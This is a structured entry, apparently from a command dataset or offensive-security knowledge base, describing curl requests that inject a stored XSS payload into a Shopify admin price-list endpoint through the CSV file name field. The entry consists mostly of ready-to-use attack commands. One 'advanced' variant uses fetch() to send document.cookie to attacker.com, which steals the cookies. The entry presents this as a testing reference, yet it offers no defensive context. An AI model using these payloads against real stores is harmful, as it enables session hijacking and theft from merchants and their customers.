---
id: cmd-uuid-001
data: >-
  curl -X POST 'https://admin.shopify.com/admin/shops/x/price_lists/x' -H
  'Content-Type: application/x-www-form-urlencoded' --data-raw
  'price_list[csv_file_name]=sample-csv-sku.csv\"-alert(document.domain)-\"'
tags:
  - http
  - xss
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T00:11:16.195Z'
verified: false
validated: true
submitted: true
---
# modify-post-request-burp

## Command

```bash
curl -X POST 'https://admin.shopify.com/admin/shops/x/price_lists/x' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'price_list[csv_file_name]=sample-csv-sku.csv\"-alert(document.domain)-\"'
```

## Description

This command simulates modifying a POST request to inject an XSS payload into the Shopify Wholesale price list update endpoint, useful for testing stored XSS via curl or as a reference for proxy tools like Burp Suite.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP method | Yes |
| `'https://...'` | Target endpoint URL | Yes |
| `-H 'Content-Type: ...'` | Sets request headers | Yes |
| `--data-raw` | Payload data with escaped quotes for JS injection | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://admin.shopify.com/admin/shops/123/price_lists/456' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'price_list[csv_file_name]=test.csv\"-alert(1)-\"'
```

### Advanced Usage

```bash
curl -X POST 'https://admin.shopify.com/admin/shops/123/price_lists/456' -H 'Authorization: Bearer token' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'price_list[csv_file_name]=test.csv\"-fetch(\'https://attacker.com/exfil?data=\' + document.cookie)-\"'
```

## Expected Output

HTTP 200 OK response with updated price list details; no immediate error, but payload stored for later execution.

## Related

- [[Related Procedure: Intercept-and-Inject-XSS-Payload]]
